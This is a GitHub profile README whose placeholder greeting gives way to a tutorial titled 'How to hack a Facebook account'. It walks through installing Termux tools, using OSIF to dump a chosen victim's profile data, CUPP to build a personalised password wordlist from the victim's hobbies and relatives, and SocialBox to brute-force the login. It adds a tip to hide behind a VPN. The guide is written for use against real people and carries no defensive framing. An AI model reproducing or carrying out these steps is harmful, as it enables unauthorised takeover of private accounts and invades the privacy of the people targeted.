- 👋 Hi, I’m @syedzakir770
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
syedzakir770/syedzakir770 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
❤️HOW TO HACK A FACEBOOK ACCOUNT @ONLINEHACKING ❤️

Requirements:
- Termux
- 200 MB space
- Facebook target link
- Info about target
- Root

Setup:
$ apt install nodejs -y

$ pkg install git tsu -y

$ apt install python python2 -y

$ apt update; apt upgrade -y

$ npm install --global facebook-id-of

1️⃣ Getting ID

The first what we need is the ID of the facebook user, this can be found out through the facebook-id-of tool, which we have installed.

On the target profile, we can see URL like this:
https://www.facebook.com/michael.schmidt.7965692 — Remove the hyperlink and copy online name after facebook.com/.

$ facebook-id-of michael.schmidt.7965692

› Facebook ID of michael.schmidt.7965692 is 671393100

2️⃣ Dumping Information About Target

For this, we're gonna using the tool OSIF, it's still working and helping us, to get some details.

$ pkg update upgrade

$ pkg install git python2

$ git clone https://github.com/ciku370/OSIF

$ cd OSIF

$ pip2 install -r requirements.txt

For this tool you need a working, non 2FA facebook account, which can be used for scanning our target. (TARGET MUST EXIST IN FRIEND LIST)

$ python2 osif.py
D3b2y >> token
Type username (email) & Password.

D3b2y >> cat_token
[*]Your access token !!

Setup done now  Hype

D3b2y >> dump_id
D3b3y >> dump_671393100

This fetching some informations about our target an example can be found here:

https://pastebin.com/10H7C22T

If you know your targets e-mail, it's much easier to attack them from the »bruteforce« tool.

D3b3y » dump_mail

Now on to creating a wordlist for bruteforcing

While people downloading random wordlists, creating wordlist with crunch and trying any other method with much effort, we can easily generate a wordlist related to information about our victim. This method has helped me several times to get into an Instagram account.

$ git clone https://github.com/Mebus/cupp.git; cd cupp/

$ python3 cupp.py -i

After tool has been started, fill out the information which you have dumped with OSIF.
It's asking :
> Do you want to add some key words about the victim? Y/[N]: y

> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: football,blue,dog,maddisonschoolmarvelmovies,black,michaeljackson

> Do you want to add special chars at the end of words? Y/[N]: n

> Do you want to add some random numbers at the end of words? Y/[N]:y

> Leet mode? (i.e. leet = 1337) Y/[N]: y

$ cp -R test.txt $HOME

Choose same, if you need keyword put all keywords about target, if you target likes barcelona football club, type barcelona,football.
These keywords can be anything the victim likes. Mother's name, hobbies, favorite movies, food, color, sports, etc.

It's saved as name, as you used for the firstname. If you don't know partner, use any best friend information, there are few apps like tellonym.me, instagram.com, snapchat.com to fetch as much information as you need.

Bruteforcing the account

$ pkg install nano -y

$ git clone https://github.com/TunisianEagles/SocialBox.git; cd SocialBox; chmod +x *.sh

$ nano install-sb.sh

Edit all sudo lines, only remove sudo:
sudo apt-get update
After:
apt update

Exit — ctrl+x — y (yes) — enter.

$ ./install-sb.sh

$ cp -R $HOME/test.txt $PWD

$ ./SocialBox.sh

CP means we are copying our text file from cupp folder to home, then from home to the socialbox folder. Do it, you need in social a wordlist which has been created. If you don't want to copy it :

Choice >  1
Enter Facebook ID / Email / Username / Number: 671393100
Enter wordlist path : $HOME/cupp/test.txt

Now the Bruterforcer will start to read your password list, or the word list you specified, and then try to test the password in the background using YOUR IP address. I have also tried to crack a Facebook account a few times, please use a VPN!


➖jillani ➖
